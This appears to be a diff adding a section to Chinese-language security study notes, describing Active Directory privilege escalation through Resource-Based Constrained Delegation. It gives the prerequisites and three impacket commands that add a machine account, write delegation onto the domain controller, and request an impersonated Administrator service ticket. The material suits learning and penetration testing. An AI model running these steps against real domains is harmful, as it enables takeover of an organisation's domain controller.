@@ -728,6 +728,32 @@ Client → Server : ACK
     * 橫向移動
     * 提權
 
+### 提權
+#### RBCD(Resource-Based Constrained Delegation)
+透過修改目標電腦的 delegation 屬性，使攻擊者控制的 machine 可以代表任意使用者取得服務票，進而 impersonate 高權限帳號。
+* 條件: 允許某台電腦（A）代表使用者，去存取另一台電腦（B）的服務
+    1. 有一個可以控制的foothold
+    2. 這個帳號的權限可以新增machine account(一般使用者可以加 10 台電腦（MachineAccountQuota）)
+    3. 你對目標 machine 有寫權限（關鍵），例如`GenericAll = Full control(WriteProperty + WriteDACL) → DC$`，代表可以修改 DC 的屬性
+* 攻擊流程
+    1. 建立一台可以完全控制的machine
+        ```bash
+        $ impacket-addcomputer <domain>/<controlled account name>:'<controlled account passwd>' -dc-ip <dc ip> -computer-name <new computer name> -computer-pass <new computer passwd>
+        ```
+    2. 寫入 delegation: 現在變成 DC 信任前面建立的 machine
+        ```bash
+        $ impacket-rbcd <domain>/<controlled account name>:'<controlled account passwd>' -dc-ip <dc ip> -action write -delegate-from <new computer name> -delegate-to DC$
+        ```
+    3. 用 Kerberos S4U
+        * S4U2Self: AKE$ 說：我要一張「Administrator 的票」，KDC 會給（但不能用）
+        * S4U2Proxy: FAKE$ 再說：我要用這張票去存取 DC 的服務，因為你剛剛設定：FAKE$ 被允許 acting on behalf of others，所以 KDC 會發一張「Administrator → DC」的 service ticket
+
+        ```bash
+        $ impacket-getST <domain>/<new computer name>:'<new computer passwd>' -dc-ip <dc ip> -spn cifs/DC.<domain> -impersonate Administrator
+        ```
+
+    DC 不會驗證：「你是不是 Administrator」，它只驗證：「你有沒有 delegation 權限」
+
 ## 資安工具與平台
 ### Overview
 
